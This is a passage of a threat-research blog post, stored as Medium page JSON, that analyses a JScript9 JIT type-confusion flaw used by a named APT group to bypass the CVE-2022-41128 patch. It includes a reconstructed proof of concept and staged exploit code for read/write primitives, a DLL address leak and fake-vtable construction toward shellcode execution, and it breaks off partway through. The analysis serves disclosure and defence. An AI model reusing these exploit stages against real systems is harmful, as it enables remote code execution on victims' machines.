(Scarcruft)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":18,"end":73,"href":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Fmatryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":73,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_30":{"__typename":"Paragraph","id":"c4f3422a977b_30","name":"a4f6","type":"H4","href":null,"layout":null,"metadata":null,"text":"2. Root Cause Analysis","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_31":{"__typename":"Paragraph","id":"c4f3422a977b_31","name":"6b3b","type":"P","href":null,"layout":null,"metadata":null,"text":"The JIT compiler of JScript9 performs optimizations on code that is executed repeatedly, and one of these optimization functions, GlobOpt::OptArraySrc, calls the ValueType::IsUninitialized function on the variables to be optimized.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":130,"end":150,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":162,"end":188,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_32":{"__typename":"Paragraph","id":"c4f3422a977b_32","name":"a87e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"void __fastcall GlobOpt::OptArraySrc(struct BasicBlock **this, IR::Opnd **a2)\n{\n\u002F\u002F...\n      v10 = (v43 + 16);\n      if ( !GlobOpt::IsLoopPrePass(this) && !ValueType::IsUninitialized(v10) )\n      {\n        v35[0] = *(v8 + 10);\n        \u002F\u002F ValueType::ISUninitialized return false\n        if ( ValueType::IsUninitialized(v35) )\n        {\n          \u002F\u002F skip type check\n          IR::Opnd::SetValueType(v6, *(v8 + 16));\n          v6 = v39;\n        }\n      }\n    }\n    goto LABEL_15;\n\u002F\u002F...c","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_33":{"__typename":"Paragraph","id":"c4f3422a977b_33","name":"79be","type":"P","href":null,"layout":null,"metadata":null,"text":"The branching that follows the call to ValueType::IsUninitialized is related to the usual arithmetic conversion. Arithmetic conversions match types when two operands have different types. By default, implicit type casting is performed by these arithmetic conversions for all operations, with the exception that the operands do not need to be type-matched for incremental (++, -) and bitwise (\u003C\u003C, \u003E\u003E, &, ^ …) operations.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":39,"end":65,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_34":{"__typename":"Paragraph","id":"c4f3422a977b_34","name":"0ba0","type":"P","href":null,"layout":null,"metadata":null,"text":"For this reason, when passing a variable initialized with an increment or decrement, or bitwise operation, the ValueType::IsUninitialized function will assume that it is a variable that does not require arithmetic conversion and return False, skipping the call to the IR::Opnd::SetValueType function to validate the type for casting, causing type confusion.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":111,"end":137,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":268,"end":290,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_35":{"__typename":"Paragraph","id":"c4f3422a977b_35","name":"8f83","type":"P","href":null,"layout":null,"metadata":null,"text":"The reconstructed PoC code based on the attacker’s payload obtained in this attack is shown below.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_36":{"__typename":"Paragraph","id":"c4f3422a977b_36","name":"f972","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u003Cscript\u003E\n    function foo() {\n        g = new ArrayBuffer(1400);\n        d = new Int32Array(g);\n        var j = 1;\n        var e = new Object({\n            a: 1,\n            b: 2,  \n            c: \"3\",\n            d: 0x414141,    \u002F\u002F Write at 0x414141\n            e: 5,\n        });\n        function boom(m) {\n            var q = d;\n            var l = q[0];\n            for (var o = 0; o \u003C 1; o++) {\n                if (m) {\n                    for (var n = 0; n \u003C 1; n++) {\n                        j++;     \u002F\u002F bypassing CVE-2022-41128 patch\n                        q = j;   \n                        break;\n                    }\n                    if(m){\n                        q = e;   \u002F\u002F Confused \n                    }\n                    q[-1] = 1;\n                }\n            }\n            if(m){\n                q[8] = 0x42424242; \u002F\u002F Write 0x42424242\n            }\n        }\n        for (let h = 0; h \u003C 100000; h++) {\n            boom(false);\n        }\n        boom(true);\n    }\n    foo();\n\u003C\u002Fscript\u003E","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"xml"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_37":{"__typename":"Paragraph","id":"c4f3422a977b_37","name":"9d54","type":"P","href":null,"layout":null,"metadata":null,"text":"By exploiting the fact that the JIT compiler skips type validation of variables initialized with the usual arithmetic conversion exception operator, an attacker could bypass the security patch in CVE-2022-41128 by simply adding code that declares the variable j and assigns it q via increment operator in the existing proof of concept for CVE-2022-41128.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":260,"end":261,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":277,"end":278,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_38":{"__typename":"Paragraph","id":"c4f3422a977b_38","name":"0a58","type":"P","href":null,"layout":null,"metadata":null,"text":"Accessing q, which has been changed to an Object type through the Int32Array’s array indexing method, can trigger Type Confusion, allowing arbitrary manipulation of the value of the address pointed to by the object’s property value.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":10,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_39":{"__typename":"Paragraph","id":"c4f3422a977b_39","name":"545e","type":"P","href":null,"layout":null,"metadata":null,"text":"The following are the debugging results for the q[8] = 0x42424242 code snippet during the PoC, comparing the machine code generated by the JIT compiler under normal behavior with the machine code generated due to the vulnerability. When the JIT compiler adds the type validation code, it calls the JavascriptOperators::OP_SetElementI_JIT function.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":48,"end":65,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":298,"end":337,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*TitdMy1pf2WZ_AsdM7y6wg.png":{"__typename":"ImageMetadata","id":"1*TitdMy1pf2WZ_AsdM7y6wg.png","originalHeight":396,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_40":{"__typename":"Paragraph","id":"c4f3422a977b_40","name":"5e16","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*TitdMy1pf2WZ_AsdM7y6wg.png"},"text":"Figure 2. Machine code generated by the JIT compiler during normal operation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_41":{"__typename":"Paragraph","id":"c4f3422a977b_41","name":"8a1c","type":"P","href":null,"layout":null,"metadata":null,"text":"The optimized machine code caused by the vulnerability removes the routine calling JavascriptOperators::OP_SetElementI_JIT and accesses the address 0x414161 (0x414141 + 4 * 8), which is the calculated offset of q[8], without type validation, to write 0x42424242.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":83,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":148,"end":175,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":211,"end":215,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":251,"end":261,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*64LTa-pL43ViyjaJ3cmKXg.png":{"__typename":"ImageMetadata","id":"1*64LTa-pL43ViyjaJ3cmKXg.png","originalHeight":474,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_42":{"__typename":"Paragraph","id":"c4f3422a977b_42","name":"40d2","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*64LTa-pL43ViyjaJ3cmKXg.png"},"text":"Figure 3. Vulnerable machine code generated by incorrect JIT engine assumptions","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_43":{"__typename":"Paragraph","id":"c4f3422a977b_43","name":"1cf7","type":"P","href":null,"layout":null,"metadata":null,"text":"The subsequent exploit steps are identical to the previously disclosed CVE-2022-41128, suggesting that the vulnerability was quickly weaponized after bypassing the patch.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_44":{"__typename":"Paragraph","id":"c4f3422a977b_44","name":"1d76","type":"H4","href":null,"layout":null,"metadata":null,"text":"3. Exploit Analysis","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_45":{"__typename":"Paragraph","id":"c4f3422a977b_45","name":"4fd0","type":"P","href":null,"layout":null,"metadata":null,"text":"We verified the actual exploit configuration and found that it exploits vulnerabilities related to type validation and memory management in the just-in-time (JIT) compiler to execute arbitrary code. In addition, a separate PoC was configured and analyzed on an affected version of Windows environment* (Windows 11 23H2 build 22631.3880) to verify the possibility of remote code execution due to type confusion. The exploitation process can be summarized in four steps.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":261,"end":301,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_46":{"__typename":"Paragraph","id":"c4f3422a977b_46","name":"2f5c","type":"OLI","href":null,"layout":null,"metadata":null,"text":"(Stage 1) Obtain Relative Read\u002FWrite Primitive\nLeak the JScript9.dll address and VirtualProtect function address through vtable and modify the Length property value of an arbitrary Array object to a large value to obtain a Relative Read\u002FWrite primitive of sufficient size.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":47,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_47":{"__typename":"Paragraph","id":"c4f3422a977b_47","name":"c78e","type":"OLI","href":null,"layout":null,"metadata":null,"text":"(Stage 2) Obtain Arbitrary Read\u002FWrite Primitive\nUsing Relative R\u002FW, manipulate the DataView object method call arguments to obtain an Arbitrary R\u002FW primitive.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":48,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_48":{"__typename":"Paragraph","id":"c4f3422a977b_48","name":"e465","type":"OLI","href":null,"layout":null,"metadata":null,"text":"(Stage 3) Configure Fake Vftable and Fake Object\nConstruct a fake literal string object with Arbitrary R\u002FW and configure the literal string method to reference the fake object.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":49,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_49":{"__typename":"Paragraph","id":"c4f3422a977b_49","name":"75c6","type":"OLI","href":null,"layout":null,"metadata":null,"text":"(Stage 4) Reference the Fake Object and Execute the Shellcode\nWhen the literal string method is called, the VirtualProtect function and shellcode of the fake vftable are called to execute arbitrary code.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":62,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_50":{"__typename":"Paragraph","id":"c4f3422a977b_50","name":"1795","type":"P","href":null,"layout":null,"metadata":null,"text":"* See Appendix B. Affected Windows Versions for a list of affected Windows versions other than these versions.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":6,"end":43,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_51":{"__typename":"Paragraph","id":"c4f3422a977b_51","name":"02cc","type":"P","href":null,"layout":null,"metadata":null,"text":"3.1 Stage 1 — Obtain Relative Read\u002FWrite Primitive","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_52":{"__typename":"Paragraph","id":"c4f3422a977b_52","name":"3d77","type":"P","href":null,"layout":null,"metadata":null,"text":"The PoC code to perform step 1 is shown below.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_53":{"__typename":"Paragraph","id":"c4f3422a977b_53","name":"76b9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"var b = new Array(256)\nfunction foo() {\n    g = new ArrayBuffer(1400);\n    d = new Int32Array(g);\n    var j = 1;\n\n\n    for (var k = 0; k \u003C 256; k++) {\n        b[k] = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15);\n    }\n   \n    var e = new Object({\n        a: 1,\n        b: 2,\n        c: \"3\",\n        d: b[52],   \u002F\u002F Get relative R\u002FW using b[52]\n        e: 5,\n    });\n\n\n    function boom(m) {\n\u002F\u002F ... Triggering Bug\n        if(p){\n            q[8] = 0x1fffffff;  \u002F\u002F Array Length\n            q[21] = 0x1fffffff; \u002F\u002F Array Actual Length\n            q[22] = 0x1fffffff; \u002F\u002F Buffer Length\n           \n            jscript9_base.addr_low = q[0] - 0x395f98;\n            jscript9_base.addr_high = q[1];\n        }\n    }\n    for (let h = 0; h \u003C 10000; h++) {\n        boom(false);\n    }\n    boom(true);\n}\nfoo();","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_54":{"__typename":"Paragraph","id":"c4f3422a977b_54","name":"0ae0","type":"P","href":null,"layout":null,"metadata":null,"text":"The typed array, Int32Array, accesses the array content by referencing a pointer at offset 0x38.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":17,"end":27,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*nuZ33mAsSsl4c9FqY8SQEQ.png":{"__typename":"ImageMetadata","id":"1*nuZ33mAsSsl4c9FqY8SQEQ.png","originalHeight":1171,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_55":{"__typename":"Paragraph","id":"c4f3422a977b_55","name":"9072","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*nuZ33mAsSsl4c9FqY8SQEQ.png"},"text":"Figure 4. Int32Array Memory Structure","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_56":{"__typename":"Paragraph","id":"c4f3422a977b_56","name":"e955","type":"P","href":null,"layout":null,"metadata":null,"text":"The machine code generated by the weak assumption thinks that the Object q is still an Int32Array and allows an approach with an array index like q[0], referencing the address of the b[52] Array object at Object q offset 0x38. For this reason, it is possible to read or write arbitrary property values of the b[52] object.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":73,"end":74,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":87,"end":97,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":146,"end":150,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":183,"end":188,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":212,"end":213,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":309,"end":314,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*vYcEALtNmWcjuvOv7vXVQQ.png":{"__typename":"ImageMetadata","id":"1*vYcEALtNmWcjuvOv7vXVQQ.png","originalHeight":834,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_57":{"__typename":"Paragraph","id":"c4f3422a977b_57","name":"6470","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*vYcEALtNmWcjuvOv7vXVQQ.png"},"text":"Figure 5. Referencing Object q as an Int32Array due to type confusion","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_58":{"__typename":"Paragraph","id":"c4f3422a977b_58","name":"c4bd","type":"P","href":null,"layout":null,"metadata":null,"text":"JScript9.dll address can be leaked by reading the vftable with q[0], q[1], the first 8 bytes of b[52]. The exploit later uses this to leak the VirtualProtect address for shellcode execution. In this case, 8 bytes are read through two array indices because the original type of q, Int32Array, handles 32-bit Integer data, which is calculated in 4-byte increments when accessing the array index.\n After the vftable leak b[52].length is tampered with to 0x1fffffff go through q[8], q[21], and q[22].","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":63,"end":67,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":69,"end":73,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":96,"end":101,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":143,"end":157,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":277,"end":278,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":280,"end":290,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":418,"end":430,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":451,"end":461,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":473,"end":477,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":479,"end":484,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":490,"end":495,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*fPzw7OrpPfXxYtV5quATiA.png":{"__typename":"ImageMetadata","id":"1*fPzw7OrpPfXxYtV5quATiA.png","originalHeight":874,"originalWidth":1500,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_59":{"__typename":"Paragraph","id":"c4f3422a977b_59","name":"689e","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*fPzw7OrpPfXxYtV5quATiA.png"},"text":"Figure 6. b[52] Array’s Length property tampered with and JScript9.dll address exfiltrated","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":9,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_60":{"__typename":"Paragraph","id":"c4f3422a977b_60","name":"2890","type":"P","href":null,"layout":null,"metadata":null,"text":"By overwriting b[52].length with 0x1ffffff, we have access to b[52][0x0] through b[52][0x1fffffff], giving us a Relative Read\u002FWrite primitive of sufficient size to exploit.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":15,"end":27,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":33,"end":42,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":62,"end":72,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":81,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XdW77MNd9x1WB1Mg8jMt-g.png":{"__typename":"ImageMetadata","id":"1*XdW77MNd9x1WB1Mg8jMt-g.png","originalHeight":370,"originalWidth":559,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_61":{"__typename":"Paragraph","id":"c4f3422a977b_61","name":"fa69","type":"IMG","href":null,"layout":"OUTSET_ROW","metadata":{"__ref":"ImageMetadata:1*XdW77MNd9x1WB1Mg8jMt-g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*VeO80D-fq24_oLUUcIC26w.png":{"__typename":"ImageMetadata","id":"1*VeO80D-fq24_oLUUcIC26w.png","originalHeight":375,"originalWidth":563,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_62":{"__typename":"Paragraph","id":"c4f3422a977b_62","name":"14fd","type":"IMG","href":null,"layout":"OUTSET_ROW_CONTINUE","metadata":{"__ref":"ImageMetadata:1*VeO80D-fq24_oLUUcIC26w.png"},"text":"Figure 7. Output of b[52].length (left)\u002Fimagebase of JScript9.dll (right)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_63":{"__typename":"Paragraph","id":"c4f3422a977b_63","name":"c90c","type":"P","href":null,"layout":null,"metadata":null,"text":"3.2 Stage 2 — Obtain Arbitrary Read\u002FWrite Primitive","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":51,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_64":{"__typename":"Paragraph","id":"c4f3422a977b_64","name":"1281","type":"P","href":null,"layout":null,"metadata":null,"text":"Use a DataView object to obtain arbitrary read\u002Fwrite primitives. A DataView provides a low-level interface for reading and writing number-type data from an ArrayBuffer. b[52]Relative R\u002FW can be used to leak the address of the DataView object. Then, b[54] can reference the DataVierw object and call the getUint32\u002FsetUint32 methods for arbitrary read\u002Fwrite.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":169,"end":174,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":249,"end":254,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":67,"end":75,"href":"https:\u002F\u002Fdeveloper.mozilla.org\u002Fko\u002Fdocs\u002FWeb\u002FJavaScript\u002FReference\u002FGlobal_Objects\u002FDataView","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_65":{"__typename":"Paragraph","id":"c4f3422a977b_65","name":"a201","type":"PRE","href":null,"layout":null,"metadata":null,"text":"    var arraybuffer = new ArrayBuffer(16);\n    var dataview = new DataView(arraybuffer);\n    b[53][0] = dataview\n  \n    \u002F\u002F Leak b[53] Array Content Pointer\n    var b53 = {\n        addr_low: b[52][32],\n        addr_high: b[52][33]\n    };\n\n\n    \u002F\u002F Overwrite b[54] Array Content Pointer\n    b[52][80] = b53.addr_low; \n    b[52][81] = b53.addr_high;\n    b[52][82] = b53.addr_low;\n    b[52][83] = b53.addr_high;\n\n\n   \u002F\u002F Get dataview object address\n    var dataview_obj = {\n        addr_low: b[54][0],\n        addr_high: b[54][1]\n    };\n\n\n    b[52][80] = dataview_obj.addr_low - 4;\n    b[52][81] = dataview_obj.addr_high;\n    b[52][82] = dataview_obj.addr_low - 4;\n    b[52][83] = dataview_obj.addr_high;\n\n\n    function read4(addr_low, addr_high) {\n        b[54][7] = addr_low;  \n        b[54][8] = addr_high;\n        return dataview['getUint32'](0, true);  \n    }\n\n\n    function write4(addr_low, addr_high, val) {\n        b[54][7] = addr_low;  \n        b[54][8] = addr_high;\n        dataview['setUint32'](0, val, true);\n    }","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_66":{"__typename":"Paragraph","id":"c4f3422a977b_66","name":"c264","type":"P","href":null,"layout":null,"metadata":null,"text":"3.3 Stage 3 — Configure Fake Vftable and Fake Object","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":52,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_67":{"__typename":"Paragraph","id":"c4f3422a977b_67","name":"77de","type":"P","href":null,"layout":null,"metadata":null,"text":"To create the fake objects, create literal, shellcode, and compound strings and assign them to b[53][1], b[53][2], and b[53][3], respectively. Find the address of each string object and find the address of b[56][0], which is the address we will use as the fake vftable.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":95,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":105,"end":113,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":119,"end":127,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":206,"end":214,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_68":{"__typename":"Paragraph","id":"c4f3422a977b_68","name":"527e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"    b[53][1] = literal_string,\n    b[53][3] = compound_string,\n    b[53][2] = shellcode;\n\n\n    \u002F\u002F b[53][1]\n    literal_str_obj = {\n        addr_low : read4(b[52][32] + 0x20, b[52][33]),\n        addr_high : read4(b[52][32] + 0x24, b[52][33])\n    };\n\n\n    \u002F\u002F b[53][2]\n    shellcode_str_obj = {\n        addr_low : read4(b[52][32] + 0x28, b[52][33]),\n        addr_high : read4(b[52][32] + 0x2C, b[52][33])\n    };\n\n\n    \u002F\u002F b[53][3]\n    compound_str_obj = {\n        addr_low : read4(b[52][32] + 0x30, b[52][33]),\n        addr_high : read4(b[52][32] + 0x34, b[52][33])\n    };\n\n\n    \u002F\u002F fake vftable (= b[56][0] address)\n    fake_vftable = {\n        addr_low : b[52][176] + 0x18,\n        addr_high : b[52][177]\n    };","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_69":{"__typename":"Paragraph","id":"c4f3422a977b_69","name":"dc65","type":"P","href":null,"layout":null,"metadata":null,"text":"Configure the Fake Object to the content buffer address of the shellcode string as follows.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_70":{"__typename":"Paragraph","id":"c4f3422a977b_70","name":"4332","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fake_obj + 0x0 = fake vftable","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":14,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_71":{"__typename":"Paragraph","id":"c4f3422a977b_71","name":"3f6c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"fake_obj + 0x8 = literal string 